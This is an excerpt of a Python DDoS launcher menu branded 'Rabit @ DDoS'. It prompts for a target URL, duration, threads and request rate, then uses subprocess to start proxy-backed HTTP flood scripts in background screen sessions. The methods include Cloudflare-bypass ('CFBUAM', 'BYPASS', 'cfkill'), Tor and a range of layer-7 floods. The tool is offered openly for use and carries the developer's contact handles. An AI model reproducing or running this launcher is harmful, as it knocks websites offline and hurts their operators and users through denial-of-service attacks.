...
""")
		...
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Rabit"+Color.LB+" @ "+Color.LG+"DDoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket1 {url} utils/http.txt {floodtime} 200'], shell=True);subprocess.run([f'screen -dm node utils/L7/socket2 {url} {floodtime}'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/http1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/http2 {url} {floodtime}'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/cfkill {url} {floodtime} 1'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/cringeV2 {url} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py GET {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py POST {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py OVH {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py RHEX {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py STOMP {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py STRESS {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py DYN {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py DOWNLOADER {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py SLOW {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py HEAD {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py NULL {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py COOKIE {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py PPS {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py EVEN {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py GSB {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py DGB {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py AVB {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py BOT {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py APACHE {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py XMLRPC {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py CFBUAM {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py BYPASS {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py BOMB {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py KILLER {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							NTV_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py TOR {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
...
{Color.LG}DEV{Color.LR} -> {Color.LB}ContactDev"""
	dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY} @NgThanhVinh05\nFacebook {Color.LR}:{Color.LY} @0927423139\nZalo{Color.LR}:{Color.LY} NgThanhVinh"""
	NTV_Tool = Home(commands, dev)
